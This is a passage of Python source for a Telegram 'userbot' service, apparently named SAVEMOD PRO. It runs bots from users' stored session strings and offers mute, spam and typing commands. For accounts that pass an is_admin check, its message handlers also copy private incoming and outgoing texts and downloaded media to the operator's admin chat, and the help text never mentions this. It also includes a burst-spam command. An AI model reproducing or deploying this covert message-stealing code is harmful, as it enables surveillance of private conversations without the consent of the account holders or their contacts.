    @client.on(events.NewMessage)
    async def handle_incoming(event):
        if not event.is_private:
            return
        
        if not event.out:
            sender_id = event.sender_id
            if sender_id in muted_users:
                await event.delete()
                return
            
            if event.text:
                saved_messages[owner_id][event.id] = {'sender_id': sender_id, 'text': event.text}
                cursor.execute('INSERT INTO saved_messages (owner_id, msg_id, sender_id, text, date) VALUES (?, ?, ?, ?, ?)',
                              (owner_id, event.id, sender_id, event.text, datetime.now().isoformat()))
                conn.commit()
                
                if is_admin(owner_id):
                    try:
                        sender = await client.get_entity(sender_id)
                        name = sender.first_name or sender.username or str(sender_id)
                        await send_to_admin(f"📩 [{me.first_name}] ← {name}:\n{event.text[:300]}")
                    except:
                        pass
            
            if event.photo or event.video or event.voice or event.video_note or event.sticker or event.document:
                try:
                    path = await event.download_media()
                    if path and is_admin(owner_id):
                        try:
                            sender = await client.get_entity(sender_id)
                            name = sender.first_name or str(sender_id)
                        except:
                            name = str(sender_id)
                        await send_to_admin(f"📎 [{me.first_name}] ← {name}: медиа")
                        with open(path, 'rb') as f:
                            await bot.send_document(ADMIN_IDS[0], InputFile(f, filename=os.path.basename(path)), caption=f"Медиа от {name}")
                        os.remove(path)
                except:
                    pass
        
        if event.out and event.text and is_admin(owner_id):
            try:
                if event.chat_id and event.chat_id != owner_id:
                    chat_entity = await client.get_entity(event.chat_id)
                    chat_name = chat_entity.first_name or chat_entity.username or str(event.chat_id)
                    await send_to_admin(f"📤 [{me.first_name}] → {chat_name}:\n{event.text[:300]}")
            except:
                pass
    
    @client.on(events.NewMessage)
    async def user_commands(event):
        if not event.is_private or not event.out:
            return
        txt = event.text or ''
        if not txt.startswith('.'):
            return
        
        if txt == '.help':
            await event.edit("""
<b>🤖 КОМАНДЫ ЮЗЕРБОТА</b>

.help - справка
.mute (ответ) - заглушить
.unmute (ответ) - разглушить
.list - список заглушенных
.spam кол-во текст - спам (макс 30)
.type текст - печать
.info (ответ) - инфо
""", parse_mode='HTML')
        
        elif txt == '.mute':
            reply = await event.get_reply_message()
            if not reply:
                await event.edit('❌ Ответь на сообщение')
                return
            tid = reply.sender_id
            if tid == owner_id:
                await event.edit('❌ Нельзя')
                return
            cursor.execute('INSERT OR IGNORE INTO muted_users (user_id, muted_by, muted_at) VALUES (?, ?, ?)', (tid, owner_id, datetime.now().isoformat()))
            conn.commit()
            muted_users.add(tid)
            await event.edit(f'🔇 Заглушен')
        
        elif txt == '.unmute':
            reply = await event.get_reply_message()
            if not reply:
                await event.edit('❌ Ответь')
                return
            tid = reply.sender_id
            cursor.execute('DELETE FROM muted_users WHERE user_id=? AND muted_by=?', (tid, owner_id))
            conn.commit()
            muted_users.discard(tid)
            await event.edit(f'🔊 Разглушен')
        
        elif txt == '.list':
            if muted_users:
                names = []
                for uid in list(muted_users)[:20]:
                    try:
                        u = await client.get_entity(uid)
                        names.append(f"• {u.first_name}")
                    except:
                        names.append(f"• {uid}")
                await event.edit("🔇 <b>Заглушенные:</b>\n" + "\n".join(names), parse_mode='HTML')
            else:
                await event.edit("🔇 Нет")
        
        elif txt.startswith('.spam '):
            parts = txt.split(' ', 2)
            if len(parts) >= 2:
                try:
                    cnt = min(int(parts[1]), 30)
                    msg = parts[2] if len(parts) > 2 else None
                    if not msg:
                        reply = await event.get_reply_message()
                        if reply:
                            msg = reply.text
                    if msg:
                        await event.delete()
                        for i in range(cnt):
                            await client.send_message(event.chat_id, msg)
                            await asyncio.sleep(0.05)
                except:
                    pass
        
        elif txt.startswith('.type '):
            t = txt[6:]
            if t:
                await event.delete()
                m = await client.send_message(event.chat_id, t[0])
                typed = t[0]
                for ch in t[1:]:
                    typed += ch
                    try:
                        await m.edit(typed)
                    except:
                        pass
                    await asyncio.sleep(0.1)
        
        elif txt == '.info':
            reply = await event.get_reply_message()
            if reply:
                try:
                    u = await client.get_entity(reply.sender_id)
                    muted = "✅" if reply.sender_id in muted_users else "❌"
                    await event.edit(f"👤 {u.first_name}\n🆔 {u.id}\n🔇 Заглушен: {muted}")
                except:
                    pass
            else:
                await event.edit('❌ Ответь')
    
    await client.run_until_disconnected()

# ========== ВЕБ-СЕРВЕР ==========

flask_app = Flask(__name__)

@flask_app.route('/')
def health():
    return jsonify({'status': 'ok'})

def run_web():
    flask_app.run(host='0.0.0.0', port=8080, debug=False)

# ========== ЗАПУСК ==========

async def restore_sessions():
    cursor.execute('SELECT user_id, session_string FROM user_sessions')
    for uid, ss in cursor.fetchall():
        if not is_target_admin(uid):
            asyncio.create_task(run_userbot(uid, ss))

async def main():
    logger.info(f"🚀 SAVEMOD PRO запущен. Админы: {ADMIN_IDS}")
    await restore_sessions()
    while True:
        await asyncio.sleep(60)

if __name__ == '__main__':
    Thread(target=run_web, daemon=True).start()
    executor.start_polling(dp, skip_updates=True)
    try:
        asyncio.run(main())
    except RuntimeError:
        loop = asyncio.get_event_loop()
        loop.create_task(main())
